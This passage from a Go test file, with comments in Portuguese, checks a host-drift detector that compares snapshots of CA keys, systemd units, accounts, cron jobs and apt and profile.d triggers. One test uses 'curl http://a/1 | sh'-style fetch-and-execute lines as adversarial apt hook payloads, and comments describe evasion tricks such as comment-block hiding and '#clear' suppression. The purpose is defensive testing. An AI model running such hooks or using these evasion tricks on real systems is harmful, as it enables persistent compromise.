}

// CA1: mesmo arquivo, mesmo Subject, mesmo Issuer — CHAVE diferente. Para o
// host, a autoridade de confiança mudou por inteiro.
func TestCA1ChaveTrocadaComMesmoDN(t *testing.T) {
	ca := func(spki, fp string) *facts.Facts {
		return &facts.Facts{CACerts: []facts.CACert{{
			File:    "/usr/local/share/ca-certificates/company.crt",
			Subject: "CN=Company Root CA", Issuer: "CN=Company Root CA",
			AutoAssinado: true, SPKI: spki, Fingerprint: fp,
		}}}
	}
	d := Comparar(
		Lado{F: ca("SHA256:aaa", "SHA256:111"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: ca("SHA256:bbb", "SHA256:222"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "ca" && m.Campo == "spki" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("trocar a chave sob o mesmo DN é trocar a autoridade: %+v", d.Mudancas)
	}
	// E a RENOVAÇÃO — mesma chave, certificado novo — não é troca de
	// autoridade: sai na contagem, não como achado.
	d = Comparar(
		Lado{F: ca("SHA256:aaa", "SHA256:111"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: ca("SHA256:aaa", "SHA256:222"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	for _, m := range d.Mudancas {
		if m.Tipo == "ca" {
			t.Errorf("renovação com a MESMA chave não é troca de autoridade: %+v", m)
		}
	}
}

// UNIT1: dois ExecStartPre apenas trocam de ordem. A unit passa a executar
// outra coisa primeiro.
func TestUNIT1ReordenarExecEhMudanca(t *testing.T) {
	unidade := func(a, b string) *facts.Facts {
		return &facts.Facts{Units: []facts.Unit{{
			Name: "u.service", Path: "/etc/systemd/system/u.service",
			Exec: []facts.ExecLine{
				{Key: "ExecStartPre", Cmd: a}, {Key: "ExecStartPre", Cmd: b}},
		}}}
	}
	d := Comparar(
		Lado{F: unidade("/usr/bin/a", "/usr/bin/b"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: unidade("/usr/bin/b", "/usr/bin/a"), Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "systemd.unit" && m.Campo == "exec" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("a ORDEM do Exec é semântica, e ordenar a apagava: %+v", d.Mudancas)
	}
}

// ACC1: dois retratos sem /etc/shadow. Os campos que vêm dele saem DECLARADOS
// como não observados — "não sei" comparado com "não sei" não é "não mudou".
func TestACC1CamposDoShadowSemLeituraNaoSaoComparados(t *testing.T) {
	conta := func() *facts.Facts {
		return &facts.Facts{
			Accounts:   []facts.Account{{Name: "deploy", UID: 1000, Shell: "/bin/bash"}},
			ShadowLido: false,
		}
	}
	ents, _ := indexar(classePorTipo(t, "conta"), conta())
	e := ents["deploy"]
	for _, campo := range []string{"sem_senha", "bloqueada"} {
		if e.Campos[campo] != "" {
			t.Errorf("%s precisa sair VAZIO sem o shadow: %q", campo, e.Campos[campo])
		}
	}
	// E com o shadow lido, o valor volta a valer.
	f := conta()
	f.ShadowLido = true
	ents, _ = indexar(classePorTipo(t, "conta"), f)
	if ents["deploy"].Campos["sem_senha"] != "false" {
		t.Error("com o shadow lido, `false` significa `false`")
	}
}

// CRON1: uma linha idêntica vira DUAS. O cron passa a executar o job duas
// vezes, e o índice colapsava as duas na mesma entidade.
func TestCRON1DuasLinhasIdenticasSaoDuasExecucoes(t *testing.T) {
	job := facts.CronEntry{File: "/etc/cron.d/x", Kind: "dropin", User: "root",
		Schedule: "17 3 * * *", Cmd: "/usr/bin/env true"}
	d := Comparar(
		Lado{F: &facts.Facts{Cron: []facts.CronEntry{job}}, Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: &facts.Facts{Cron: []facts.CronEntry{job, job}}, Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "cron" && m.Campo == "cmd" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("de uma execução para duas é mudança: %+v", d.Mudancas)
	}
}

// A DUPLICAÇÃO NÃO PODE INVENTAR MUDANÇA DE `user` OU `schedule`.
//
// Os dois FAZEM PARTE DO ID do agendamento, então duas entradas do mesmo ID têm
// os dois iguais por construção. A primeira versão aplicava o multiconjunto à
// entidade inteira, e duplicar uma linha produzia TRÊS achados:
//
//	cmd       "A"          -> "A, A"        ← verdade
//	user      "root"       -> "root, root"  ← falso
//	schedule  "17 3 * * *" -> "…, …"        ← falso
//
// Acertar que houve drift não autoriza a mentir sobre qual campo mudou.
func TestCRON1DuplicacaoNaoInventaOutrosCampos(t *testing.T) {
	job := facts.CronEntry{File: "/etc/cron.d/x", Kind: "dropin", User: "root",
		Schedule: "17 3 * * *", Cmd: "A"}
	d := Comparar(
		Lado{F: &facts.Facts{Cron: []facts.CronEntry{job}}, Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: &facts.Facts{Cron: []facts.CronEntry{job, job}}, Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var doCron []facts.MudancaDrift
	for _, m := range d.Mudancas {
		if m.Tipo == "cron" {
			doCron = append(doCron, m)
		}
	}
	if len(doCron) != 1 {
		t.Fatalf("uma duplicação é UMA mudança, e saíram %d: %+v", len(doCron), doCron)
	}
	if doCron[0].Campo != "cmd" {
		t.Errorf("o campo que muda é o comando, não `%s`", doCron[0].Campo)
	}
}

// CRON2: a multiplicidade tem de sobreviver a uma TROCA de proporção, e não só
// à contagem total.
//
// A primeira versão guardava a cardinalidade do ID num campo próprio, e colidia
// aqui: `A A B` e `B B A` têm três entradas cada, e os valores viravam
// conjunto — `A,B` dos dois lados. A tinha duas execuções e passou a ter uma; B
// fez o contrário; e o drift não via nada. O código existia justamente para
// preservar multiplicidade.
func TestCRON2ProporcaoTrocadaEhMudanca(t *testing.T) {
	job := func(cmd string) facts.CronEntry {
		return facts.CronEntry{File: "/etc/cron.d/x", Kind: "dropin", User: "root",
			Schedule: "17 3 * * *", Cmd: cmd}
	}
	antes := &facts.Facts{Cron: []facts.CronEntry{job("A"), job("A"), job("B")}}
	depois := &facts.Facts{Cron: []facts.CronEntry{job("B"), job("B"), job("A")}}
	d := Comparar(
		Lado{F: antes, Caps: tudoVisivel, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: depois, Caps: tudoVisivel, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "cron" && m.Campo == "cmd" {
			achou = true
			if m.Antes == m.Depois {
				t.Errorf("o multiconjunto precisa distinguir as proporções: %q", m.Antes)
			}
		}
	}
	if !achou {
		t.Fatalf("A caiu de duas execuções para uma e B subiu: %+v", d.Mudancas)
	}
}

// CONTA NOVA É VISTA MESMO SEM /etc/shadow.
//
// A chave de lacuna `users` cobre passwd, shadow, group e sudoers. Sem root o
// shadow é SEMPRE ilegível, então a chave está sempre suja — e a família de
// contas, que a consumia, parava de reportar `surgiu` em todo host sem root.
// Uma conta uid 0 acrescentada entre dois retratos, com o /etc/passwd
// perfeitamente legível, ficava calada porque OUTRO arquivo não abriu.
func TestContaNovaEhVistaMesmoSemShadow(t *testing.T) {
	semShadow := func(nomes ...string) *facts.Facts {
		f := &facts.Facts{
			PasswdLido:    true,
			GroupLido:     true,
			PersistDenied: map[string][]string{"users": {"/etc/shadow ilegível"}},
		}
		for i, n := range nomes {
			f.Accounts = append(f.Accounts, facts.Account{Name: n, UID: 1000 + i})
			f.Grupos = append(f.Grupos, facts.Grupo{Name: n, GID: 1000 + i})
		}
		return f
	}
	d := Comparar(
		Lado{F: semShadow("deploy"), Caps: env.CapFilesystem, Host: "h", Quando: "2026-01-01T00:00:00Z"},
		Lado{F: semShadow("deploy", "backdoor"), Caps: env.CapFilesystem, Host: "h", Quando: "2026-01-02T00:00:00Z"})
	achou := map[string]bool{}
	for _, m := range d.Mudancas {
		if m.Kind == Surgiu {
			achou[m.Tipo] = true
		}
	}
	for _, tipo := range []string{"conta", "grupo"} {
		if !achou[tipo] {
			t.Errorf("`%s` nova precisa aparecer: a presença vem de um arquivo que "+
				"FOI lido, e a lacuna é de outro. Mudanças: %+v", tipo, d.Mudancas)
		}
	}
}

func classePorTipo(t *testing.T, tipo string) Classe {
	t.Helper()
	for _, c := range classes {
		if c.Tipo == tipo {
			return c
		}
	}
	t.Fatalf("classe %q não registrada", tipo)
	return Classe{}
}

// A TABELA DE COBERTURA não pode apodrecer, nos dois sentidos.
//
// Ela existe para responder, seis meses depois, "por que X não tem drift?" — e
// só serve se estiver certa. Família registrada fora da tabela é esquecimento
// disfarçado de decisão; entrada na tabela sem família é decisão que já foi
// tomada e ninguém apagou.
func TestTabelaDeCoberturaBateComORegistro(t *testing.T) {
	registrados := map[string]bool{}
	for _, c := range classes {
		registrados[c.Tipo] = true
	}
	naTabela := map[string]bool{}
	for _, s := range Cobertas {
		if s.Tipo == "" {
			t.Errorf("%q está entre as COBERTAS e não nomeia família", s.Nome)
			continue
		}
		if naTabela[s.Tipo] {
			t.Errorf("%q aparece duas vezes na tabela", s.Tipo)
		}
		naTabela[s.Tipo] = true
		if !registrados[s.Tipo] {
			t.Errorf("a tabela diz que `%s` (%s) é coberta, e ela NÃO está "+
				"registrada: ou a família foi removida, ou o nome mudou", s.Tipo, s.Nome)
		}
	}
	for tipo := range registrados {
		if !naTabela[tipo] {
			t.Errorf("a família `%s` está registrada e NÃO aparece na tabela de "+
				"cobertura: sem a linha, ninguém sabe daqui a seis meses se a "+
				"superfície ao lado dela foi decisão ou esquecimento", tipo)
		}
	}
	// Exclusão sem motivo é a mesma armadilha do `MaxWarn: 0`: parece decisão e
	// não afirma nada.
	for _, s := range NaoCobertas {
		if s.Porque == "" {
			t.Errorf("%q está entre as NÃO cobertas sem motivo escrito", s.Nome)
		}
		if s.Tipo != "" {
			t.Errorf("%q está entre as NÃO cobertas e nomeia uma família", s.Nome)
		}
	}
}

// E a de COMPLETUDE, que é outra coisa: todo campo de facts.Facts precisa estar
// CLASSIFICADO, coberto ou não.
//
// A tabela sozinha provava consistência — "toda família registrada aparece
// aqui". Não provava que ninguém esqueceu uma superfície: um campo novo em
// Facts, estável e security-sensitive, passava sem que ninguém tivesse decidido
// nada. Este teste força a decisão UMA vez, no commit que acrescenta o campo,
// que é quando ela é barata e quando o contexto está fresco.
//
// Ele não julga se a decisão foi boa — nenhum teste pode. Ele garante que
// houve uma.
func TestTodoFatoEstaClassificado(t *testing.T) {
	classificado := map[string]string{}
	for _, s := range Cobertas {
		if s.Campo == "" {
			t.Errorf("a superfície coberta %q não aponta para campo nenhum de Facts", s.Nome)
			continue
		}
		classificado[s.Campo] = s.Nome
	}
	for _, s := range NaoCobertas {
		if s.Campo == "" {
			t.Errorf("a superfície NÃO coberta %q não aponta para campo nenhum", s.Nome)
			continue
		}
		classificado[s.Campo] = s.Nome
	}
	tp := reflect.TypeOf(facts.Facts{})
	for i := 0; i < tp.NumField(); i++ {
		campo := tp.Field(i)
		nome := strings.Split(campo.Tag.Get("json"), ",")[0]
		if nome == "" || nome == "-" {
			// Sem forma serializada não há o que comparar entre dois retratos.
			continue
		}
		if classificado[nome] == "" {
			t.Errorf("o campo `%s` (facts.%s) não está classificado: acrescente-o a "+
				"Cobertas — com a família que o compara — ou a NaoCobertas, com o "+
				"MOTIVO.\n\nA pergunta a fazer não é \"dá para comparar?\", é: este é um "+
				"ESTADO ESTÁVEL cujo desvio tem significado de segurança? Se a "+
				"resposta for não, a linha de exclusão é a resposta — e ela é o que "+
				"impede alguém, daqui a seis meses, de não saber se foi decisão ou "+
				"esquecimento.", nome, campo.Name)
		}
	}
}

// A CATRACA QUE FALTAVA, e ela custou OITO defeitos para existir.
//
// Todos tinham a mesma forma: uma família dependia de uma chave de lacuna que
// cobria mais fontes do que ela — `net`, `modulo`, `users` duas vezes, `ssh`,
// `trust`, `loader`, `binfmt`. Em todas, a falha de UMA fonte suprimia a
// comparação de OUTRA que tinha sido lida perfeitamente, e o resultado era
// silêncio: o pior modo de falha desta base.
//
// Nenhuma das outras catracas pega isto. A de completude pega o campo
// esquecido; a de extração pega o campo que decide e não sai. Esta pega a
// DEPENDÊNCIA larga demais, das duas formas que dá para pegar mecanicamente.
func TestNenhumaFamiliaHerdaChaveDeOutra(t *testing.T) {
	dono := map[string]string{}
	for _, c := range classes {
		for _, k := range c.Lacunas {
			if outro, ja := dono[k]; ja {
				t.Errorf("as famílias `%s` e `%s` dependem da MESMA chave de lacuna "+
					"`%s`.\n\nDuas famílias na mesma chave é a forma exata dos oito "+
					"defeitos anteriores: a falha da fonte de uma suprime a comparação "+
					"da outra. Cada uma precisa de um FATO de completude próprio, lido "+
					"por Incompleta — a chave continua servindo ao operador, que é "+
					"para quem ela foi escrita.", outro, c.Tipo, k)
			}
			dono[k] = c.Tipo
		}
	}
}

// E a metade que a máquina não consegue conferir sozinha: se a chave cobre
// exatamente a fonte da família. Isso exige ler o coletor, e por isso a
// resposta é ESCRITA — o que a catraca garante é que alguém a deu.
func TestTodaDependenciaDeLacunaFoiConferida(t *testing.T) {
	for _, c := range classes {
		if len(c.Lacunas) == 0 {
			continue
		}
		if strings.TrimSpace(c.LacunaConferida) == "" {
			t.Errorf("`%s` depende da(s) chave(s) %v e não declara LacunaConferida.\n\n"+
				"A pergunta a responder é uma só, e ela custou oito defeitos: ESTA "+
				"CHAVE COBRE MAIS DE UMA FONTE? As chaves são do operador — elas "+
				"nomeiam um subsistema no relatório —, e usar uma como dependência de "+
				"máquina só é correto quando ela cobre exatamente a fonte de que esta "+
				"família depende. Se cobrir mais, o caminho é um fato de completude "+
				"próprio, como fizeram passwd, shadow, group, sudoers, doas, ssh, "+
				"trust, loader e binfmt.", c.Tipo, c.Lacunas)
		}
	}
}

// O drift do gatilho tem de ver o HOOK do apt, não só Trigger.Lines.
//
// Um apt.conf.d adversário esconde o comando atrás de um bloco /* … */ que fecha
// depois de um #, e o parser genérico descarta a linha: em Lines fica só "/*",
// idêntico nos dois retratos. O comando muda em AptHooks, e é AptHooks que decide
// o que o apt executa. Se o drift lê Lines, uma troca de payload no hook passa
// sem ruído — cego ao mesmo fato que subiu o SchemaVersion para existir.
func TestDriftDoGatilhoVeOHookDoApt(t *testing.T) {
	apt := func(cmd string) facts.Trigger {
		return facts.Trigger{
			File: "/etc/apt/apt.conf.d/99hook", Kind: "pkg_hook",
			When:     "a cada operação do gerenciador de pacotes",
			Lines:    []facts.TriggerLine{{N: 1, Text: "/*"}}, // idêntico nos dois
			AptHooks: []facts.TriggerLine{{N: 2, Text: cmd}},
		}
	}
	antes := &facts.Facts{Triggers: []facts.Trigger{apt("curl http://a/1 | sh")}}
	depois := &facts.Facts{Triggers: []facts.Trigger{apt("curl http://b/2 | sh")}}
	d := Comparar(lado(antes, tudoVisivel), lado(depois, tudoVisivel))

	var achou bool
	for _, m := range d.Mudancas {
		if m.Tipo == "startup.trigger" && m.Kind == Mudou && m.Campo == "linhas" {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("o payload do hook mudou (a→b) e o drift não viu — está lendo "+
			"Lines em vez de AptHooks: %+v", d.Mudancas)
	}
}

// Um #clear no apt.conf.d NÃO pode cegar o drift de /etc/profile.d.
//
// O #clear declara lacuna sobre a config EFETIVA do apt — mas é semântica local
// do apt. Se ele for para a fonte "startup", contamina todo trigger não-git:
// profile.d, rc.local, PAM, cron. Um atacante removeria /etc/profile.d/x e
// plantaria um apt.conf.d/99noise com `#clear Foo::Unrelated;`, e a remoção do
// profile.d seria suprimida. A fonte "apt" isola a incerteza.
func TestClearDoAptNaoCegaProfileD(t *testing.T) {
	prof := func(cmd string) facts.Trigger {
		return facts.Trigger{File: "/etc/profile.d/x.sh", Kind: "shell",
			When: "login", Lines: []facts.TriggerLine{{N: 1, Text: cmd}}}
	}
	// ANTES: profile.d/x existe. DEPOIS: some. E o DEPOIS tem um apt com #clear,
	// que declara lacuna "apt" — mas não pode afetar a fonte "startup".
	antes := &facts.Facts{Triggers: []facts.Trigger{prof("export PATH=/opt/bin:$PATH")}}
	depois := &facts.Facts{
		Triggers: []facts.Trigger{{File: "/etc/apt/apt.conf.d/99noise", Kind: "pkg_hook",
			When: "a cada operação do gerenciador de pacotes"}},
		Partial: map[string][]string{"apt": {"/etc/apt/apt.conf.d/99noise usa #clear ..."}},
	}
	d := Comparar(lado(antes, tudoVisivel), lado(depois, tudoVisivel))

	var sumiu bool
	for _, m := range d.Mudancas {
		if m.Tipo == "startup.trigger" && m.Kind == Sumiu &&
			strings.Contains(strings.Join(m.Alvos, " "), "profile.d/x.sh") {
			sumiu = true
		}
	}
	if !sumiu {
		t.Fatalf("a remoção de /etc/profile.d/x.sh foi suprimida por um #clear do "+
			"apt: a lacuna 'apt' contaminou a fonte 'startup'. Mudanças: %+v", d.Mudancas)
	}
}
